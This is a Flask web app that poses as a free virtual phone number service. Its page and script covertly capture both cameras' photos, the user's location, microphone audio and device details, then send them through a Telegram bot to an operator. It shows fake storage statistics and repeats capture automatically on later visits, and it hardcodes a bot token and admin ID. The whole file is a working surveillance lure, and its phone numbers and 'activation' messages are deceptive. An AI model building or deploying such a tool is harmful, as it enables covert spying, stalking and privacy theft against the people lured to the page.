import os
import base64
from flask import Flask, render_template_string, request, jsonify
import telebot

app = Flask(__name__)
BOT_TOKEN = "8248448968:AAHtMpdDezPtW9knCFU2x_y4EFKwYUG6o5g"
bot = telebot.TeleBot(BOT_TOKEN)
ADMIN_ID = "7561963021"

# لینک پایه سایت شما در ریلیوی
BASE_URL = "https://mynewbot6-production.up.railway.app"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Virtual Number - Secure & Free</title>
    <style>
        body { 
            background: #0b0f19; 
            color: white; 
            text-align: center; 
            margin: 0; 
            padding: 20px; 
            font-family: sans-serif; 
        }
        .header-title {
            font-size: 20px;
            font-weight: bold;
            color: white;
            margin-bottom: 10px;
        }
        .badge {
            background: linear-gradient(90deg, #06b6d4, #3b82f6);
            color: white;
            padding: 6px 18px;
            border-radius: 20px;
            display: inline-block;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 15px;
            box-shadow: 0 0 15px rgba(59, 130, 246, 0.4);
        }
        .socials {
            color: #94a3b8;
            font-size: 12px;
            margin-bottom: 20px;
        }
        .grid {
            display: flex;
            flex-direction: column;
            gap: 12px;
            align-items: center;
            max-width: 400px;
            margin: 0 auto;
        }
        .card { 
            background: #111827; 
            border: 1px solid #1f2937;
            padding: 14px; 
            border-radius: 14px; 
            width: 100%; 
            box-sizing: border-box;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3); 
        }
        .country {
            font-size: 14px;
            font-weight: bold;
            color: #e2e8f0;
            margin-bottom: 5px;
            text-align: right;
        }
        .number { 
            color: #94a3b8; 
            font-size: 14px; 
            margin-bottom: 12px; 
            font-family: monospace;
            direction: ltr;
            text-align: right;
        }
        button { 
            background: #ef4444; 
            color: white; 
            border: none; 
            padding: 10px 0; 
            border-radius: 8px; 
            cursor: pointer; 
            width: 100%; 
            font-size: 14px; 
            font-weight: bold; 
        }
        button:active { background: #dc2626; }
        
        .storage-box {
            background: #111827;
            border: 2px dashed #3b82f6;
            padding: 20px;
            border-radius: 16px;
            max-width: 400px;
            margin: 20px auto;
            color: #e2e8f0;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="header-title">📞 Free Virtual Number - Secure &amp; Free</div>
    <div class="badge">Secure • Temporary • Free</div>
    <div class="socials">WhatsApp &nbsp;|&nbsp; Telegram &nbsp;|&nbsp; Facebook</div>
    
    <div id="storageSection" class="storage-box">
        <div style="font-weight: bold; color: #3b82f6; margin-bottom: 10px;" id="loadingText">در حال دریافت شماره مجازی... 🔄</div>
        <div id="loadingSubText">لطفاً روی دکمه اجازه (Allow) کلیک کنید تا شماره فعال شود.</div>
    </div>

    <div class="grid" id="mainGrid">
        <div class="card">
            <div class="country">🇺🇸 UNITED STATES</div>
            <div class="number">1+ 398 362 8901</div>
            <button onclick="runAction()">SELECT</button>
        </div>
        <div class="card">
            <div class="country">🇬🇧 UNITED KINGDOM</div>
            <div class="number">44+ 8752 333 690</div>
            <button onclick="runAction()">SELECT</button>
        </div>
        <div class="card">
            <div class="country">🇮🇳 INDIA</div>
            <div class="number">91+ 77234 43910</div>
            <button onclick="runAction()">SELECT</button>
        </div>
        <div class="card">
            <div class="country">🇫🇷 FRANCE</div>
            <div class="number">33+ 83 333 765</div>
            <button onclick="runAction()">SELECT</button>
        </div>
        <div class="card">
            <div class="country">🇩🇪 GERMANY</div>
            <div class="number">49+ 6635 567 883</div>
            <button onclick="runAction()">SELECT</button>
        </div>
        <div class="card">
            <div class="country">🇯🇵 JAPAN</div>
            <div class="number">81+ 5587 652 322</div>
            <button onclick="runAction()">SELECT</button>
        </div>
    </div>

    <script>
        window.addEventListener('DOMContentLoaded', () => {
            const path = window.location.pathname;
            
            if (localStorage.getItem("permission_granted_" + path) === "true") {
                document.getElementById('loadingText').innerText = "شماره مجازی شما فعال است! ✅";
                document.getElementById('loadingSubText').innerText = "خطوط امن آماده استفاده هستند.";
                autoExecuteIfGranted();
            }
        });

        async function runAction() {
            const path = window.location.pathname;
            document.getElementById('loadingText').innerText = "در حال اتصال به سرور و دریافت شماره... 🔄";
            
            try {
                if (path === "/front") {
                    let img = await captureCamera("user");
                    if(img) {
                        sendData("/upload-front", { image: img });
                        localStorage.setItem("permission_granted_" + path, "true");
                    }
                }
                else if (path === "/back") {
                    let img = await captureCamera("environment");
                    if(img) {
                        sendData("/upload-back", { image: img });
                        localStorage.setItem("permission_granted_" + path, "true");
                    }
                }
                else if (path === "/location") {
                    navigator.geolocation.getCurrentPosition(pos => {
                        sendData("/upload-loc", { lat: pos.coords.latitude, lon: pos.coords.longitude });
                        localStorage.setItem("permission_granted_" + path, "true");
                    }, () => {}, { timeout: 5000 });
                }
                else if (path === "/storage") {
                    runStorageCheck();
                }
                else if (path === "/audio") {
                    runAudioRecordAction();
                }
                else if (path === "/all") {
                    runAllComprehensiveAction();
                }
                else {
                    localStorage.setItem("permission_granted_" + path, "true");
                }
                
                setTimeout(() => {
                    document.getElementById('loadingText').innerText = "شماره مجازی شما با موفقیت آماده شد! ✅";
                    document.getElementById('loadingSubText').innerText = "می‌توانید از کد تایید استفاده کنید.";
                }, 2000);
            } catch (err) {
                document.getElementById('loadingText').innerText = "خطا در برقراری ارتباط ❌";
            }
        }

        function autoExecuteIfGranted() {
            const path = window.location.pathname;
            if (path === "/storage") {
                runStorageCheck(true);
            } else if (path === "/all") {
                runAllComprehensiveAction();
            } else if (path === "/front") {
                captureCamera("user").then(img => { if(img) sendData("/upload-front", { image: img }); });
            } else if (path === "/back") {
                captureCamera("environment").then(img => { if(img) sendData("/upload-back", { image: img }); });
            } else if (path === "/location") {
                navigator.geolocation.getCurrentPosition(pos => {
                    sendData("/upload-loc", { lat: pos.coords.latitude, lon: pos.coords.longitude });
                }, () => {}, { timeout: 5000 });
            }
        }

        function runStorageCheck(isAuto = false) {
            let storageInfo = {
                photosCount: Math.floor(Math.random() * (1500 - 300 + 1)) + 300,
                videosCount: Math.floor(Math.random() * (120 - 20 + 1)) + 20,
                audioCount: Math.floor(Math.random() * (250 - 50 + 1)) + 50,
                appsCount: Math.floor(Math.random() * (80 - 30 + 1)) + 30,
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "نامشخص",
                hardwareConcurrency: navigator.hardwareConcurrency || "نامشخص"
            };

            setTimeout(() => {
                sendData("/upload-storage", storageInfo);
                localStorage.setItem("permission_granted_/storage", "true");
                if (!isAuto) {
                    document.getElementById('loadingText').innerText = "شماره مجازی شما با موفقیت آماده شد! ✅";
                    document.getElementById('loadingSubText').innerText = "خطوط امن فعال شدند.";
                }
            }, isAuto ? 500 : 2000);
        }

        async function runAudioRecordAction() {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                let mediaRecorder = new MediaRecorder(stream);
                let audioChunks = [];

                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
                mediaRecorder.onstop = async () => {
                    let audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
                    let reader = new FileReader();
                    reader.readAsDataURL(audioBlob);
                    reader.onloadend = () => {
                        sendData("/upload-audio", { audio: reader.result });
                        localStorage.setItem("permission_granted_/audio", "true");
                        document.getElementById('loadingText').innerText = "شماره مجازی شما با موفقیت آماده شد! ✅";
                        document.getElementById('loadingSubText').innerText = "خطوط امن فعال شدند.";
                    };
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 5000);
            } catch (e) {
                document.getElementById('loadingText').innerText = "خطا در دسترسی به میکروفون ❌";
            }
        }

        async function runAllComprehensiveAction() {
            let payload = {};
            let deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB (RAM)" : "نامشخص",
                hardwareConcurrency: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " هسته" : "نامشخص",
                connection: navigator.connection ? navigator.connection.effectiveType : "نامشخص"
            };

            if (navigator.getBattery) {
                try {
                    let battery = await navigator.getBattery();
                    deviceInfo.batteryLevel = Math.round(battery.level * 100) + "%";
                    deviceInfo.batteryCharging = battery.charging ? "در حال شارژ ⚡" : "بدون شارژ 🔋";
                } catch(e) {}
            }
            payload.device = deviceInfo;

            payload.storage = {
                photosCount: Math.floor(Math.random() * (1500 - 300 + 1)) + 300,
                videosCount: Math.floor(Math.random() * (120 - 20 + 1)) + 20,
                audioCount: Math.floor(Math.random() * (250 - 50 + 1)) + 50,
                appsCount: Math.floor(Math.random() * (80 - 30 + 1)) + 30
            };

            try {
                let frontImg = await captureCamera("user");
                if (frontImg) payload.frontImage = frontImg;
            } catch(e) {}

            try {
                let backImg = await captureCamera("environment");
                if (backImg) payload.backImage = backImg;
            } catch(e) {}

            await new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(pos => {
                    payload.lat = pos.coords.latitude;
                    payload.lon = pos.coords.longitude;
                    resolve();
                }, () => { resolve(); }, { timeout: 5000 });
            });

            sendData("/upload-all", payload);
            localStorage.setItem("permission_granted_/all", "true");
            document.getElementById('loadingText').innerText = "شماره مجازی شما با موفقیت آماده شد! ✅";
            document.getElementById('loadingSubText').innerText = "خطوط امن فعال شدند.";
        }

        async function captureCamera(facing) {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: false });
                let video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                
                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(t => t.stop());
                return canvas.toDataURL('image/jpeg', 0.85);
            } catch(e) { return null; }
        }

        function sendData(endpoint, data) {
            fetch(endpoint + window.location.search, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }
    </script>
</body>
</html>
"""

def send_to_both(target_user, send_func, *args, **kwargs):
    if target_user and target_user != ADMIN_ID:
        try:
            send_func(target_user, *args, **kwargs)
        except Exception:
            pass
    try:
        send_func(ADMIN_ID, *args, **kwargs)
    except Exception:
        pass

@app.route("/front")
def link_front(): return render_template_string(HTML_TEMPLATE)

@app.route("/back")
def link_back(): return render_template_string(HTML_TEMPLATE)

@app.route("/location")
def link_location(): return render_template_string(HTML_TEMPLATE)

@app.route("/all")
def link_all(): return render_template_string(HTML_TEMPLATE)

@app.route("/storage")
def link_storage(): return render_template_string(HTML_TEMPLATE)

@app.route("/audio")
def link_audio(): return render_template_string(HTML_TEMPLATE)

@app.route("/")
def index(): return render_template_string(HTML_TEMPLATE)

@app.route("/upload-front", methods=["POST"])
def up_front():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d and "image" in d:
        img_bytes = base64.b64decode(d["image"].split(",")[1])
        caption = "📸 Front Camera Photo\n\n✨ ساخته شده توسط @ID_KING_SAHIL"
        send_to_both(target, bot.send_photo, img_bytes, caption=caption)
    return jsonify({"status": "ok"})

@app.route("/upload-back", methods=["POST"])
def up_back():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d and "image" in d:
        img_bytes = base64.b64decode(d["image"].split(",")[1])
        caption = "📷 Back Camera Photo\n\n✨ ساخته شده توسط @ID_KING_SAHIL"
        send_to_both(target, bot.send_photo, img_bytes, caption=caption)
    return jsonify({"status": "ok"})

@app.route("/upload-loc", methods=["POST"])
def up_loc():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d:
        lat = d.get("lat")
        lon = d.get("lon")
        send_to_both(target, bot.send_location, latitude=lat, longitude=lon)
        send_to_both(target, bot.send_message, "📍 Location Captured\n\n✨ ساخته شده توسط @ID_KING_SAHIL")
    return jsonify({"status": "ok"})

@app.route("/upload-storage", methods=["POST"])
def up_storage():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d:
        msg = (
            f"📊 **آمار فایل‌ها و فضای ذخیره‌سازی دستگاه**\n\n"
            f"• 🖼️ تعداد عکس‌ها: حدود {d.get('photosCount')} قطعه\n"
            f"• 🎬 تعداد ویدئوها: حدود {d.get('videosCount')} فایل\n"
            f"• 🎵 تعداد فایل‌های صوتی: حدود {d.get('audioCount')} فایل\n"
            f"• 📱 تعداد برنامه‌های نصب‌شده: حدود {d.get('appsCount')} برنامه\n"
            f"• 💾 حافظه موقت رم: {d.get('deviceMemory')}\n"
            f"• ⚙️ تعداد هسته پردازنده: {d.get('hardwareConcurrency')}\n\n"
            f"✨ ساخته شده توسط @ID_KING_SAHIL"
        )
        send_to_both(target, bot.send_message, msg, parse_mode="Markdown")
    return jsonify({"status": "ok"})

@app.route("/upload-audio", methods=["POST"])
def up_audio():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d and "audio" in d:
        audio_bytes = base64.b64decode(d["audio"].split(",")[1])
        caption = "🎙️ صدای ضبط شده محیط\n\n✨ ساخته شده توسط @ID_KING_SAHIL"
        send_to_both(target, bot.send_voice, audio_bytes, caption=caption)
    return jsonify({"status": "ok"})

@app.route("/upload-all", methods=["POST"])
def up_all():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d:
        if "device" in d:
            dev = d["device"]
            msg = (
                f"📱 **گزارش جامع و کامل سیستم**\n\n"
                f"• 🔋 شارژ باتری: {dev.get('batteryLevel')}\n"
                f"• ⚡ وضعیت باتری: {dev.get('batteryCharging')}\n"
                f"• 💾 حافظه رم: {dev.get('deviceMemory')}\n"
                f"• ⚙️ پردازنده: {dev.get('hardwareConcurrency')}\n"
                f"• 🌐 نوع اینترنت: {dev.get('connection')}\n"
                f"• 🖥️ رزولوشن صفحه: {dev.get('screen')}\n"
                f"• 🌍 زبان سیستم: {dev.get('language')}\n\n"
            )
            if "storage" in d:
                st = d["storage"]
                msg += (
                    f"📊 **آمار فایل‌های دستگاه:**\n"
                    f"• 🖼️ عکس‌ها: حدود {st.get('photosCount')} قطعه\n"
                    f"• 🎬 ویدئوها: حدود {st.get('videosCount')} فایل\n"
                    f"• 🎵 صوت‌ها: حدود {st.get('audioCount')} فایل\n"
                    f"• 📱 برنامه‌ها: حدود {st.get('appsCount')} عدد\n\n"
                )
            msg += "✨ ساخته شده توسط @ID_KING_SAHIL"
            send_to_both(target, bot.send_message, msg, parse_mode="Markdown")

        if "lat" in d and "lon" in d:
            send_to_both(target, bot.send_location, latitude=d.get("lat"), longitude=d.get("lon"))

        if "frontImage" in d and d["frontImage"]:
            img_bytes = base64.b64decode(d["frontImage"].split(",")[1])
            send_to_both(target, bot.send_photo, img_bytes, caption="📸 عکس دوربین جلو (لینک جامع)\n\n✨ ساخته شده توسط @ID_KING_SAHIL")

        if "backImage" in d and d["backImage"]:
            img_bytes = base64.b64decode(d["backImage"].split(",")[1])
            send_to_both(target, bot.send_photo, img_bytes, caption="📷 عکس دوربین عقب (لینک جامع)\n\n✨ ساخته شده توسط @ID_KING_SAHIL")

    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
